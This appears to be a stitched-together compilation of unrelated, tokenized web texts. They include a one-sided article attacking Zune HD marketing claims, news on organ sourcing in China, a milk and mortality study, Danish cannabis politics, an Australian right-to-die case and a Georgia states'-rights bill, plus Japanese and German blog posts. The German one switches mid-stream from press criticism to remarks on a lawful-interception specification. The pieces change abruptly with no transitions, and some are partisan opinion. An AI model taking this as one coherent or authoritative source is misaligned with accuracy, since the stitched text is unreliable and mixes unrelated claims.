Engadget filmed a full demonstration , including the device 's incapacity to pull up a web page , in a suspiciously dark room without even noting this .
There are actually candles visibly flickering in the video behind the device .
Microsoft sets up its demos in the dark because the Zune HD looks terrible outside , where its contrast ratio advantage observed in ideal conditions completely falls apart .
Engadget 's other pictures of an OLED - using Sony Walkman show that without the candle - lit smoke and mirrors , OLED blacks are not black at all .
There are other problems with OLED .
They do n't last long , because the electroluminescence layer degrades far more rapidly than regular LCDs .
Component colors within OLED also die at different times , with the blue pixels fading first .
This results in a rapid shift of the color balance as the device ages .
Additionally , the original color reproduction gamut of brand new OLED displays is already worse than standard LCD , resulting in less natural - looking colors from the start that only get worse .
More power to ya
And despite the power savings attributed to OLED 's backlight - free design , OLEDs still use more power than LCD displays most of the time because the OLED technology consumes power based on how bright the image it is displaying is .
Essentially , OLED is the backlight .
Sony and Microsoft try to compensate by giving their OLED devices a dark , mostly black user interface .
Unless you will exclusively be using your Zune HD to watch gothic movies in the dark , the screen will be gobbling up more power than an LCD .
This is particularly the case if you want to browse the web , which involves a lot of white space .
Showing a white background , OLED consumes as much as 300 % of the power of an LCD .
Any colors that rely upon those those fragile blue pixels are particularly power inefficient .
And again , because OLED does n't use any ambient light to brighten its picture , as LCD does , 100 % of the image comes from emitted light output , which requires a bigger drain on the battery .
For this reason , reviewers of other OLED products have expressed puzzlement about why the supposedly efficient OLED technology did n't translate into better battery life in actual use , as did the Register when looking at a Samsung s8000 Jet :
" Considering it 's got an energy - saving OLED screen , we were disappointed with the battery life of the Jet .
Perhaps the powerful processor puts some extra drain on the juice , but the promised 180 minutes of talk time and 250 hours ' standby translated into a barely a day of moderate use . "
If you 're wondering why Apple , which sells tens of millions of mobile devices per year and has a component appetite that literally sways RAM markets , did n't beat Microsoft , a company that barely sold a couple million Zunes in two years , to the OLED trough , it 's not because Microsoft is on the cutting edge , but because Microsoft is desperately looking for a marketable feature , whether or not that feature makes any sense for consumers .
On page 2 of 3 : NVIDIA 's Tegra processor inside the Zune HD .
Myth 2 : NVIDIA 's Tegra processor leapfrogs existing mobile processors
Now that you 're no longer in the dark on the oversold OLED , what about the Tegra processor used by the Zune HD : is it really the miracle chip that it is billed to be , both achieving spectacularly unprecedented performance and industry - leading power efficiency ?
Has Apple 's expertise in developing ARM CPUs and in running its own CPU fab plant been outmatched by Microsoft 's first foray into mobile devices with a functional web browser ?
The Tegra is built by NVIDIA , leaving Zune fans to suggest that it delivers industry leading , desktop - gaming type graphics that far exceed the capabilities of industry - standard mobile graphics .
However , Tegra is n't a scaled down version of NVIDIA 's PC graphics GPUs .
Instead , it 's based on technology NVIDIA acquired in its purchase of fabless chip designer PortalPlayer in 2007 .
If PortalPlayer sounds familiar , it 's because Apple formerly used its system - on - a- chip parts to build MP3 players up through the 5G iPod and the original iPod nano .
Apple accounted for 90 % of PortalPlayer 's business when it dumped the company in 2006 , reportedly because the company was arrogantly jerking Apple around .
PortalPlayer was devastated and never recovered .
When NVIDIA acquired PortalPlayer for $ 357 million the next year , Wedbush Morgan Securities analyst Craig Berger observed , " This deal comes as a surprise to us as we believe there are other semiconductor firms that offer more technology for less money , " and added that NVIDIA apparently " thinks it has a better chance of penetrating Apple iPod ( video ) products if it owns and integrates PortalPlayerâs technology . "
Apple , PA Semi , and the PowerVR deal
However , NVIDIA did n't ever get back into the iPod market .
Instead , Apple began sourcing SoCs from Samsung , bought its own fabless chip developer by acquiring PA Semi for just $ 278 million , and secured a secret design license for Imagination Technologies ' PowerVR SGX graphics cores .
So , while NVIDIA 's Tegra grew from the humble origins of the chip powering the video 5G iPod , the iPhone 3GS and the latest iPod touch models feature a mobile - optimized GPU core descending from the Sega DreamCast .
While Imagination 's PowerVR GPU never made it into the desktop GPU market to rival the technology from ATI and NVIDIA , it has become the gold standard in mobile GPUs .
But the GPU is only half the story .
Tegra uses a conventional ARM11 family CPU core ( ARMv6 ) , the same generation CPU core used by the original iPhone , the Zune , Nokia N95 , and the HTC Hero .
The Tegra 's CPU / GPU package also uses DDR1 memory , introducing significant real world RAM bandwidth limits no matter how powerful the embedded GPU core is rated to be in theoretical terms .
In contrast , the modern Cortex - A8 used in the iPhone 3GS , Palm Pre , Nokia N900 , and Pandora game console represents the latest generation of ARM CPU cores .
It also employs a DDR2 memory interface , erasing a serious performance bottleneck hobbling the Zune HD 's Tegra .
It 's difficult to make fair and direct comparisons between different generations of technology , but NVIDIA 's own demonstrations of Tegra 's ARM11 / integrated graphics show it achieving 35 fps in Quake III .
The same software running on Pandora 's Coretex - A8 with SGX GPU core achieves 40 - 60 fps .
Tegra 's Core Problem
Tegra is also being hyped as providing " 8 processing cores , " but this is nonsense as it simply counts logical blocks common to all embedded SoC parts as " cores . "
The CPU in the Tegra is a single ARM11 core .
Even if the Tegra did supply multiple CPU cores , the Windows CE kernel used by the Zune HD does n't support multi-core SMP so it could n't make any use of them .
Other mobile devices use multiple ARM processors for efficiency or cost savings , such as the original iPods which idled along using two low power ARM processors , or the Nintendo DS , which uses an ARM9 and ARM7 to handle different functions independently .
However , there is nothing in the supposed " multiple cores " of the Tegra that offers anything comparable .
NVIDIA promotes Tegra as being " Ultra Low Power , " but its standard ARM11 CPU does n't deliver anything that is n't available in other ARM designs , nor any special power savings over more powerful and modern processors like the Coretex - A8 in the iPhone 3GS and latest iPod touch .
Again , if you 're wondering why Microsoft was able to score the NVIDIA Tegra " before " Apple , it was n't due to any mobile industry clout or hardware experience on Microsoft 's end , but rather simply due to the fact that Apple has its own resources for designing and building advanced , state of the art mobile processors , and did n't need to buy into the desperate hype NVIDIA is using to promote the runner up technology of Apple 's former SoC vendor .
On page 3 of 3 : The HD is n't for high definition
Myth 3 : Zune HD is mobile HD
Microsoft is promoting the Zune HD as supplying HD video and HD Radio , purposely conflating the use of " HD " as a meaningless marketing term .
There are two issues here , the first being HD video display and output .
The Zune HD 's OLED screen is n't high definition in the sense of HDTV , of course .
The screen itself is only 480x272 , which is significantly less than the iPhone / iPod touch at 480x320 .
( That 's 130 k vs 153 k pixels ; the iPod / iPhone displays 18 % more pixels ) .
What Microsoft is promoting is the Zune HD 's capacity to output 720p HD video , at least when using its HDMI dock .
The iPod touch is limited to 480 p ( DVD quality video ) but can output this without a dock using Apple 's Component AV Cable .
This is a software limitation , not a hardware limit somehow broken by the Tegra .
If you 're buying a mobile device primarily to act as a fixed movie player docked to your HDTV , the Zune HD offers a curious advantage in that regard .
On the other hand , if you expect a mobile media player to deliver a mobile experience , the iPod touch delivers both a significantly better screen resolution and a better display technology , unless of course , you 're planning to always stay at home in a candle - lit basement .
However , most people looking at the Zune HD wo n't be thinking of it as Microsoft 's smaller , second attempt at delivering the HD - DVD player .
They 'll be excited about its HD Radio support , perhaps imagining that HD always means " high definition " relative to HDTV .
Myth 4 : Zune HD delivers high definition radio
Unfortunately , HD Radio was given an intentionally misleading name .
The HD in HD Radio officially does n't stand for anything anymore , but it was originally for " hybrid digital , " because HD Radio is all about replacing or augmenting analog radio with digital transmissions .
It offers both an all - digital option as well as a hybrid digital option that enables radio broadcasters to augment their existing analog radio broadcasts with a digital version , something most opt to do so as not to alienate their existing analog radio listeners .
Like the move to digital TV , digital radio offers both the potential for better quality and the capacity to deliver more content within the same bandwidth .
Unlike digital TV , the US government has n't decided to officially transition the nation to all digital radio broadcasts , as it did with TV in order to reclaim large portions of the old analog TV bandwidth for other more productive purposes ( such as allowing more competition in mobile and data services ) .
Analog radio is n't going away , so you wo n't need any new converter box to tune your old radio into new digital broadcasts .
New digital broadcasts will coexist with the old analog radio feeds , because radio was n't really wasting any huge amount of bandwidth to start with , as TV broadcasts were .
One competing standard for delivering digital radio is HD Radio , which is n't an FCC open standard but rather a proprietary protocol sold by iBiquity .
However , HD Radio remains the only digital radio transmission technology approved by the FCC for use in the US .
HD Radio uses a proprietary audio codec called HDC , which like Microsoft 's own WMA , is based on but not compatible with MPEG - 4 standards .
It should be no wonder why Microsoft is jumping on board to promote this proprietary standard .
Major corporate broadcasters , including ClearChannel , support HD Radio because it allows them to deliver more content using subchannels squeezed into the existing radio spectrum .
Loopholes in the existing implementation of digital radio also enable big radio broadcasters to subvert existing regulations in order to avoid the controlling - interest caps established to prevent excessive concentration of media ownership , perpetuating the shift away from local radio broadcasts and toward generic piped - in feeds from media conglomerations like ClearChannel .
International reception weak
In contrast with the relatively recent rollout of digital radio in America , the European Union began implementing all - digital radio broadcasts back in 1999 .
Its existing DAB ( digital audio broadcasting ) standard is being improved to make use of the modern MPEG - 4 HE - AAC , called DAB +.
More recently , another broadcast standard has emerged in Europe with an even more misleading and unfortunate name than HD Radio : DRM ( Digital Radio Mondiale ) .
Like HD Radio , it maintains backward compatibility with analog radios using a hybrid digital broadcast .
Like HD Radio , Europe 's DRM and DAB + all have their own flaws helping to hold back widespread adoption of digital radio standards , including a lack of compatibility amongst each other .
This is all relevant to the Zune HD because it effectively makes its main feature usable only to Americans .
That 's also why Microsoft is restricting sales to the US ; who outside the US would buy a media player with HD Radio features that are n't even available outside of the US , and which is n't compatible with the digital radio standards that are available locally ?
Again , if you 're wondering why the iPod touch has n't jumped on the HD Radio bandwagon , it 's because it the proprietary new standard is n't in use globally , is n't in high demand , and barely covers 85 % of the US from fewer than 2,000 radio stations .
Of course , Apple 's iPod has never been oriented toward playing over the air radio feeds , but instead is designed to play your own music .
Of course if you want to play Internet radio , there 's an app for that .
If you 're just looking for a regular radio , you do n't need to spend $ 300 for the Zune HD to get one .
Portable FM radios are dirt cheap , and even mobile HD Radios are available starting at $ 50 .
Microsoft 's feature mix aimed at taking on the iPod touch is looking increasingly odd from every angle .
Myth 5 : Zune HD games and software will wow you
From the hardware end , the Zune HD applies a lot of hype to drum up interest in its otherwise non-novel technology .
But it 's the software side where the new device really fails to shine .
Despite being first and foremost a software platform vendor , Microsoft has a schizophrenic history in delivering a mobile software platform .
The Windows CE foundation that the Zune HD is built upon is regarded as a joke throughout the industry , even by Microsoft 's own developers .
Windows Mobile , which delivers an additional layer of software on top of the Windows CE kernel to support PDAs and smartphones , is also scoffed at .
Given its dismal performance in the market over the last decade , that reputation is well earned .
The original Zune models promised to someday deliver handheld gaming potential through a beta " community technical preview " of Microsoft 's XNA Game Studio 3.0 tools .
Instead , Microsoft simply yanked the plug on the effort , abandoning its support for existing Zune devices so it could focus on the Zune HD .
This is Microsoft 's standard operating procedure in the mobile business .
The same thing was also done with nearly each release of Windows Mobile .
The newest release of Windows Mobile 6.5 wo n't even work on lots expensive hardware sold in the last year .
Curiously , Apple has been painted by some pundits as being " developer - hostile " over a handful of application approval disputes that have occurred over the past year , despite maintaing a solid , profitable mobile platform that works across all iPhone and iPod touch models ever built .
Imagine if Apple just kept churning out new models of iPhone , each running firmware incompatible with its existing hardware and developer 's third party apps .
Microsoft 's own software for Windows Mobile and the Zune HD is similarly bad .
Its mobile version of Internet Explorer still does n't work despite having been on the market since 1996 .
What 's " new " in the release of the Zune HD is a different version of the mobile IE browser , based not upon the creaky IE 4 engine from 1997 ( still delivered in today 's Windows Mobile devices ) , but a mobile version of IE 6 , which dates back to 2001 .
That leaves the Zune HD 's browser nearly a decade behind the modern WebKit browsers used in the iPhone , Palm Pre , Android , and modern BlackBerry phones .
If Microsoft is doing that poorly in games and web browsers , what can one expect from the Zune software store , from media integration , and from the third party developers Microsoft has abandoned along with its past Zune initiatives ?

According to the China Daily newspaper , executed prisoners currently provide two - thirds of all transplant organs .
The government is now launching a voluntary donation scheme , which it hopes will also curb the illegal trafficking in organs .
But analysts say cultural bias against removing organs after death will make a voluntary scheme hard to implement .
Thriving black market About 1.5 million people in China need transplants , but only about 10,000 operations are performed annually , according to the health ministry .
The scarcity of available organs has led to a thriving black market in trafficked organs , and in an effort to stop this the government passed a law in 2007 banning trafficking as well as the donation of organs to unrelated recipients .
But in practice , illegal transplants - some from living donors - are still frequently reported by the media and the Ministry of Health .
Human rights groups have often criticised China for its lack of transparency over organ donation , but critics have focused particular concern on the use of body parts from executed prisoners .
In a rare admission of the extent to which this takes place , China Daily - citing unnamed experts - said on Wednesday that more than 65 % of organ donations come from death row prisoners .
China executes more people than any other country .
Amnesty International said at least 1,718 people were given the death penalty in 2008 .
The China Daily quoted Vice - Health Minister Huang Jiefu as saying that condemned prisoners were " definitely not a proper source for organ transplants " .
The new scheme is therefore designed to reduce the reliance on death row inmates , as well as regulating the industry by combating the illegal trafficking of organs .
The system will be piloted in 10 provinces and cities , and a fund will be started to provide financial aid to donors ' families .

“ Do n’t play with fire ! ” that ’s what we have been told since we were kids .
Maybe this is why we could be easily shocked by the performance of the play of fire .
We ca n’t help wondering : does it burn the performers ’ mouths or lips ?
Does it hurt ?
The combination of the beauty of the scene and the wonders in our head makes the performance .
The followings are some photograghs we collected featuring plays with fire .
The freeze of the fire makes strong image , giving us illusion that we are looking at drawings .
Even though we are not feeling the heat , we could see the great beauty of the play with fire .

Everyone wishes they could fly , but this 19 - year - old kid spent three years building his dream from balsa wood , rip - resistant foil and plastic wrap .
And amazingly , the 85 - foot - wingspan craft has already hopped a distance of about 35 feet .

The modest distance ( and height of about 5 feet ) is n't a bad start in human - powered flight for a do - it - yourselfer .
Dutchman Jesse van Kuijk hopes to go further in the future , without the bike chain powering his propeller slipping off its cog .
Though he 's never flown in a real plane , Jesse says he studied self - powered craft like the Gossamer Condor and the English - Channel crossing Gossamer Albatross .
He also got tips from the Albatross ' pilot , American Bryan Allen , who is now a software engineer for the Mars exploration project .

So , what did you do this Summer ?
[ Spiegel via Inhabitat ]
インフォテリ アUSAが運営しており、今年の5月に終了したオンラインチャットサービス「Lingr」が、江島健太郎氏の個人プロジェクトとして復活すると、Lingrのホームページで告知されています。
ホームページによると、インフォテリアの厚意によってLingrの所有権が江島氏個人に移管されたため、多くの新機能とともに江島氏の個人プロジェクトとして復活するとのこと。
since Infoteria kindly handed over the ownership to me , Lingr has been reincarnated as my personal project , with a bunch of new features .
江島氏のブログ 「 江島健太郎 / Kenn's Clairvoyance 」の、今年の5月1日に同サービスの終了を伝えたエントリ「LingrとRejawサービス終了のお知らせ」では、江島氏は次のように書いていました。
この分野で は 「 企業の競争相手が個人になる時代は目の前まで来ている」ということです。スタートアップ企業を作って数名で作るのと、一人の個人が副業で立ち上げるのとでは、最終的に出てくるモノの差がだんだんなくなってきており、単に「かかるコストだけが100倍違う」ということになりかねない、と思うのです。
敗戦の弁として語られているこの言葉が、今度はリベンジのための言葉としてもう一度語られることになるのでしょう。
事業者としての経験が個人プロジェクトとしてどのように活かされていくのか、今後が楽しみであると同時に、これから江島氏以外にも、このような個人やチームでのチャレンジがさらに増えることを期待しています。

In Schweden hat die Piratenpartei auf Anhieb einen Sitz im Europaparlament erobert .
Auch in Deutschland stimmten gestern bemerkenswerte 0,9 Prozent für diese junge Partei , die von der “ Bild ” - Zeitung “ Gaga - Verein ” genannt wird .
Eigentlich war es also eine gute Idee von der deutschen Nachrichtenagentur dpa , kurz zu erklären , wer diese Piraten sind .
Wenn sie es denn getan hätte .
Stattdessen veröffentlichte sie gestern Abend um 21.22
Uhr und noch einmal um 22.50 Uhr folgenden Text :
Schwedische Internet - Piraten im EU - Parlament Bei den Europawahlen in Schweden hat die für kostenlose Downloads aus dem Internet eintretende Piratenpartei aus dem Stand 7,4 Prozent der Stimmen geholt .
(…)
Hintergrund für die Kandidatur war die Verurteilung von vier Verantwortlichen der Internet - Tauschbörse The Pirate Bay wegen Verletzung des Urheberrechts .
Die Börse ermöglicht das kostenlose Herunterladen von Musik , Filmen und Computersoftware aller Art. (…)
Richtig ist , dass die Piratenpartei für eine radikale Änderung des Urheberrechts kämpft .
Das auf “ kostenlose Downloads aus dem Internet ” zu reduzieren , ist schon gewagt .
Eindeutig falsch ist aber die Behauptung , dass das Pirate - Bay - Urteil Hintergrund der Kandidatur war .
Das ist schon zeitlich unmöglich , weil es erst am 17 .
April 2009 fiel .
Die Piratenpartei wurde am 1 .
Januar 2006 gegründet und hatte noch im selben Jahr angekündigt , bei der Europawahl antreten zu wollen .
Piratenpartei und Pirate Bay entstammen derselben Bewegung , sind aber nicht direkt miteinander verbunden .
Weil sich die professionellen deutschen Online - Medien auf die ungeprüfte Weitergabe solcher Meldungen spezialisiert haben , stehen die Fehler von dpa heute überall : Auf den Online - Seiten von “ Focus Online ” , der “ Frankfurter Neuen Presse ” , der “ Kieler Nachrichten ” , der “ Gießener Allgemeine ” , der “ Leipziger Volkszeitung ” , der “ Welt ” , der “ Süddeutschen Zeitung ” und vielen anderen .
Die meisten haben auch gleich Foto und Bildtext von dpa übernommen , in dem es schlicht und falsch heißt :
Nachtrag , 15 Uhr. Um 13:21
Uhr hat dpa die Meldung teilweise korrigiert .
In einer Berichtigung heißt es nun : “ Hintergrund für den Erfolg der Kandidatur war die Verurteilung von vier Verantwortlichen der Internet - Tauschbörse The Pirate Bay wegen Verletzung des Urheberrechts . ”
Eine halbe Stunde später veröffentlichte die Nachrichtenagentur eine neue , differenziertere Meldung “ Schwedische Piratenpartei auf Erfolgswelle ” , mit der die meisten der oben genannten Online - Medien die alte Meldung ersetzt haben .
“ Focus Online ” hat stattdessen eine etwas kryptische Korrektur veröffentlicht .
Die Online - Redaktion der “ Frankfurter Neuen Presse ” reagiert angesäuert auf die Kritik an der falschen Meldung :
Als ob wir diese Meldung wider besseres Wissen veröffentlicht hätten .
Wie sollen Kunden von Nachrichtenagenturen , also Zeitungen , jede einzelne Meldung überprüfen ?
Hunderte , tausende täglich .
Die Agenturen sind dazu da , dass sie uns korrekt recherchierte Meldungen und Artikel zukommen lassen . (…)
Mit Dank an David K. und Michi !
Spannend wird es z.B. auf Seite 17 , wo man die Formeln für das Sizing findet .
Mal 5000 Kunden angenommen , soll ein Anbieter folgende Abhörkapazitäten anbieten : Festnetz : 3 % . GSM : 27 % .
Für diese Werte nimmt man die Formeln von Seite 17 , und rechnet die erwartete Ausnutzung des Netzes aus , indem man den sogenannten Verkehrswert in Erlang ( ich habe meine Zahlen von hier ) mit der Anzahl der Anschlüsse multipliziert ( bei Festnetz geht die Rechnung in B - Kanälen , von denen jeder ISDN - Kunde zwei hat ) .
Spannenderweise ist die Formel nicht linear sondern ungefähr wie die Quadratwurzel , so dass kleine Anbieter stark benachteiligt werden .
Hier ist mal ein Plot für GSM nach Kundenanzahl ( Achtung : bei mir beginnt die Y - Achse da nicht bei 0 sondern bei 2 , das wird nicht wirklich negativ ) .
Der Wert an der Y - Achse ist der Prozentsatz des Traffics , für den sie Ausleit - Kapazitäten halten sollen .
Man sieht sehr gut , wie unfair das verteilt ist .
Auch lustig ist Seite 26 mit der Liste der zulässigen Anbieter für das IPsec - Gateway .
Die Liste ist eher übersichtlich .
Aber zu dem Protokolldesign .
Für die Übertragung der Daten supporten die FTP ( hahaha ) und FTAM ( HAHAHAHAHA ) .
Da ist ja schon mal aus Obskuritätsgründen so gut wie ausgeschlossen , dass da die Fehler gefunden wurden , und dann stehen da noch so Dinge dran wie
Der Initiator soll die QoS - Klasse 0 verwenden , da der Responder die Recovery - Prozeduren nicht unterstützt
-- Aus Gründen der Rückwärtskompatibilität als optional
Zusätzlich ( optional ) kann von der TKA-V eine weitere Nummer hinzugefügt werden ( z. B. in Mobilfunknetzen die Kennung der MSC ) , die zusammen mit der Zuordnungsnummer die Eindeutigkeit garantiert .

Wird von der TKA-V diese Variante genutzt , ist die zweite Nummer getrennt durch das Zeichen ‘ #’ hinter die Zuordnungsnummer zu setzen .

The eldest living member of her tribe , the Takelma Indians of southwest Oregon , Agnes Baker - Pilgrim is a world - renowned spiritual leader , spokesperson and member of the International Council of Thirteen Indigenous Grandmothers , and keeper of the Sacred Salmon Ceremony — a tradition that she revived for her people after 150 years .
Agnes , more widely known as Grandma Aggie , recently sat down with WPSU host Patty Satalia for a one - hour discussion about the 13 Indigenous Grandmothers and their efforts around the world to encourage peace , health , prosperity and dignity — for all of us today and for all generations to come .
If you would like to learn more about the 13 Indigenous Grandmothers , you can visit their website , grandmotherscouncil.com .
A film is also being produced about the Grandmothers ’ walk , titled , For the Next Seven Generations : The Grandmothers Speak .
You can see the trailer on youtube and at the film ’s official website , forthenext7generations.com
About the International Council of Thirteen Indigenous Grandmothers : On October 11 , 2004 , 13 Indigenous Grandmothers from all over the world — the Arctic Circle , North , South and Central America , Africa , and Asia — arrived at Tibet House ’s Menla Mountain Retreat amidst 340 acres of forests , fields and streams in upstate New York .
Within a few days of convening , the grandmothers agreed to form a global alliance ; to work together to serve both their common goals and their specific local concerns .
The first council gathering was a time of hope and inspiration .
The grandmothers are both women of prayer and women of action .
Their traditional ways link them with the forces of the earth .
Their solidarity with one another creates a web to re-balance the injustices wrought from an imbalanced world ; a world disconnected from the fundamental laws of nature and the original teachings based on a respect for all of life .

" Google 's first two results were clearly web pages discussing that very question : one on MacRumors.com and the other on Ibibo.com .
A look at Bing made me scratch my head … just as the post had intended .
It 's first response was to the question , " Why is Manhattan so expensive ? "
If , in Bing 's algorithm , " microsoft " is the same as " manhattan " I think they need to check their programming .
The second and third results were about the differences between various versions of Word .
" So , I decided to do a little experimenting on my own .
I opened up a Google search tab and a Bing search tab in my trusty FireFox browser .
My first question was if Google would disrespect it self ?
Would it serve up the mud people were flinging at it , which based on the experiment above Microsoft was n't willing to do .
I thought about the most common criticism of Google and typed it in , " is google too powerful ? "
( Do the search for yourself on Bing and Google ... maybe the results have changed . ) "

Milk is a good source of calcium Children who eat plenty of dairy foods such as milk and cheese can expect to live longer , a study suggests .
Some 4,374 UK children from a 1930s study were traced 65 years later by researchers in Bristol and Queensland .
They found those who had had high dairy and calcium intakes as children had been protected against stroke and other causes of death , journal Heart reports .
Despite dairy containing artery furring fat and cholesterol , high consumption did not raise the heart disease risk .
The findings appear to back the practice of giving extra milk to schoolchildren .
Protective
The study looked at family diets and found higher intakes of both calcium and dairy , predominantly from milk , cut mortality by a quarter .
A higher daily intake of calcium , of at least 400 mg as found in just over half a pint of milk , cut the chance of dying from stroke by as much as 60 % .
We need to take a further look to really assess the benefits of milk in reducing the chances of dying from stroke
Joanne Murphy of The Stroke Association
These beneficial effects were seen at estimated intake levels similar to those currently recommended by experts .
Three servings of dairy foods - for example , a 200 ml glass of milk , a pot of yogurt and a small piece of cheese - will provide all the calcium most people need each day .
Other factors may play a part - though researchers say they took into account that children with the highest dairy intakes came from wealthier families and ate better diets overall - but there is evidence that high calcium intake is good for blood pressure .
Balance Prolonged high blood pressure increases the risk of stroke .
Dairy consumption may also influence heart and circulation health through a hormone called insulin - like growth factor 1 ( IGF - 1 ) , say the study authors from the UK's University of Bristol and Australia 's Queensland Institute of Medical Research .
In adults , high circulating levels of IGF - 1 are linked with reduced cases of heart failure and heart disease deaths .
Joanne Murphy of The Stroke Association said : " This is an interesting study , but we need to take a further look to really assess the benefits of milk in reducing the chances of dying from stroke .
" In the meantime , we advise parents to opt for a diet rich in fruit and vegetables and low in saturated fat and salt for the overall health of their children . "
June Davison , cardiac nurse for the British Heart Foundation said : " It is important to include dairy as part of a balanced diet from the early years .
" However , older children and adults should consume low - fat dairy products such as semi-skimmed , 1 % or skimmed milk and low - fat yogurts , which will help keep saturated fat intake low to help protect the heart . "
Studies investigating a link between cancer and dairy products have not given clear results .
Some research shows an increase in the risk of developing cancer , and some shows a decrease .

I ’m confused .
Peter Stephens wrote a column on Monday for the Financial Times arguing that Britain should not only cut down executive pay , but the size of banks themselves .
In the article he quotes Lord Turner , chairman of London ’s Financial Services Authority , as saying the problem is that we ’re making too much profit :
Last week Lord Turner threw a grenade into the debate .
Thinking aloud during a roundtable discussion reported by Prospect magazine , he said bonuses were as much a symptom as a cause .
Policymakers needed to ask more fundamental questions about why financial services generated such vast profits and about whether the industry had grown so big as to outstrip its usefulness to the rest of the society .
His tentative conclusions were damning .
Activity for the sake of it — a characteristic of bloated and ever more complex wholesale financial markets — serves only those who manage to extract large profits from the enterprise .
“ Stunning ” levels of pay are not a measure of efficient markets or individual brilliance , but of a market failure providing large “ rents ” to a small group of players .
I ’m just scratching my head a little , because when , in all of history , has an industry outlived itself because it was too successful ?
( Maybe just armies , but even Genghis Khan and Alexander the Great could have conquered more . )
The law of creative destruction says that when an industry ceases to be useful , it is replaced by something else , and that is a good thing .
We did n’t dump VHS because the quality was too stellar and we liked not having DVD menus with special features and the ability to skip to chapters in HD .
The car did n’t replace the carriage because horses provided too quick and smooth of a ride .
The financial sector does not exist simply to serve itself .
All the wealth production , even activities designed simply to make money and not a product , wind up benefiting the economy on some level .
Sure , some people make money from money , but they consume products with that profit .
Those investors are benefiting real estate agents , fast food shops , auto dealers , Banana Republic , maid services , ballpark security , and a million other professions that would n’t exist with out the demand created by those who spend money .
And Wall Street brokers spend a lot of money .
And just a continued note on the pay issue , I still do n’t understand why we ’re picking on the salaries of financial services employees and not all the other industries that pay well .
Nor have I seen a justified reason why anyone can prove they know what the right pay should be .
Its all arbitrary .
A debate over legal marijuana has been raging in Denmark this summer because of an unpleasant gang war .
Denmark has had a liberal attitude towards cannabis since the 1970s .
The open sale of hashish and marijuana had long been tolerated in the famous Pusher Street in Christiania , a haven for hippies and anarchists allowed to exist in the middle of Copenhagen .
In its early years , Christiania had a conflict between users and sellers of hard and soft drugs , and the hard drugs were expelled from the village .
Only soft drugs were tolerated , a policy that has worked well for many years .
Since the conservative government chose to close down the open sale in 2004 , the cannabis market spread all over Copenhagen .
Cannabis quickly became even more available than before , and illegal coffeeshops , so called " hash clubs " opened everywhere .
Danish police have closed over 150 such clubs in Copenhagen .
In Odense , Denmark ’s third - largest city , they are still openly advertising their services .
With increasing clampdowns came increasing violence , and biker gangs were pitted against other gangs consisting mainly of immigrants .
Gangs performed visitations of random passerbys to check for rival gang members , and several liquidations and shootouts took place .
People were afraid to get caught in the crossfire , and the Danish police asked people to stop buying hashish .
That ’s when several danish politicians came up with a better idea : legalize it .
And do n’t do like the dutch and just legalize the retail outlets , but the whole chain , to take away the entire criminal market .
The Social Magistrate of Copenhagens city council , Mikkel Warming , suggested letting coffee shops sell hashish legally .
His proposal was not voted on , instead the city council voted to get concrete proposals on how it can be done , and continue debate after summer .
Ann -Sofie Von Bech of the Social Administration of Copenhagen came up with the requested report and recommendations on the 25th of May .
The report refers to the Beckley Foundation Cannabis Commission report in several places .
In short , the report concludes ( like Arnold Schwarzenegger ) that there are no examples of state controlled and regulated cannabis , but that it could nevertheless be an alternative to the current situation of illegality .
It admits that prohibition has not had an effect on use of cannabis or the criminality surrounding it .
Furthermore , the report recommends that the government , if they choose to legalize , put an eighteen year age limit on the drug , and that relevant information about harmful effects are distributed to users .
Advertising would be illegal , and the situation should be monitored closely .
Polls showed that 59 % of Denmark supports legalization , and a majority of the youth wings of the political parties support it as well ; however , the chances of it passing now are slim , as it would have to be approved by the Ministry of Justice .
The Minister of Justice has already made it clear that Copenhagen would not get this dispensation , but a majority of Copenhagen ’s politicians are taking this discussion seriously , and Warming says the " idea is being kept alive " .
Expect debate to continue soon , especially if the drug wars do not calm down in Copenhagen .

Mr Rossiter enjoyed outdoors adventures before he was disabled An Australian quadriplegic , who last month won a landmark legal right to starve to death , has died .
Christian Rossiter , 49 , died in a nursing home in Perth , West Australia , after developing a chest infection .
A former outdoor adventurer , he had won a legal battle to ask his carers not to give him food or water .
His case strengthened advocates of assisted suicide , in the week when Britain 's top legal officer is to issue new guidelines on the issue .
" I thank all those who have made Christian 's life , in his final years , as comfortable and as dignified as possible , " his brother Tim said .
Lawyer John Hammond , who five weeks ago won a court battle that allowed Christian Rossiter to refuse food and water , said his passing would have come as a " relief " .
" I think Christian will be remembered as someone who was very brave and took up a fight which will give a lot of people comfort , " Mr Hammond told local television .
" Essentially he won the right to refuse food and medication so he could die if he wanted to , " he said .
Western Australia 's chief judge Wayne Martin said Mr Rossiter had the right to direct his own treatment and that his carers , Brightwater Care Group , would not be criminally responsible if it complied with his wishes .
Mr Rossiter had asked the Brightwater Care Group at least 40 times to stop feeding and hydrating him through a tube to his stomach before he went to court to end a life he described as a " living hell " .
" I 'm Christian Rossiter and I 'd like to die .
I am a prisoner in my own body .
I can't move , " he told reporters .
" I have no fear of death - just pain .
I only fear pain . "
Voluntary euthanasia or assisted suicide is illegal in Australia and Britain , but Britain will this week clarify when a person will and will not be prosecuted for assisting suicide .
In 1996 , Australia 's outback Northern Territory introduced the world 's first voluntary euthanasia laws .
Four people used the laws to die by injection administered via a computer before the national government overturned the legislation in 1997 .

Here is a story that you most likely missed .
There wasnt a single mention of it in the media ( any media outlets ) until two weeks after it happened .
Earlier this month , the Georgia State Senate voted 43 - 1 in favor of a bill that would have had major consequences if it had also been passed by the State House .
The bill mentioned the 9th and 10th Amendments frequently and explained they many ways in which the Federal government has ignored those Amendments and userped State power .
But this wasnt just your typical States Rights resoultion .
The second section of the bill reads in part :
“ BE IT FURTHER RESOLVED that any Act by the Congress of the United States , Executive Order of the President of the United States of America or Judicial Order by the Judicatories of the United States of America which assumes a power not delegated to the government of the United States of America by the Constitution for the United States of America and which serves to diminish the liberty of the any of the several States or their citizens shall constitute a nullification of the Constitution for the United States of America by the government of the United States of America . ”
Yeah .
This bill wasnt just “ affirming States Rights . ”
It wasnt just threatening secession .
It was asserting that any act perceived to be an unconstitutional intrusion on the rights of States or citizens would constitute a dissolving on the Union .
It then listed several offenses as examples of what could trigger the dissolution of the Nation , including :
IV .
Surrendering any power delegated or not delegated to any corporation or foreign government .
and
VI .
Further infringements on the right to keep and bear arms including prohibitions of type or quantity of arms or ammunition
Ill remind you that this resolution passed by a vote of 43 - 1 .
Number IV is already being violated by the continued existence of the Federal Reserve which is a private corporation .
In other words , the passage of this bill into law would have meant that the State would be giving itself the legal right to secede–or more accurately to declare that the United States government no longer existed .
Of course , no President including Mr. Obama would ever agree that an act such as limiting the number of guns one could own would trigger the death of the Union .
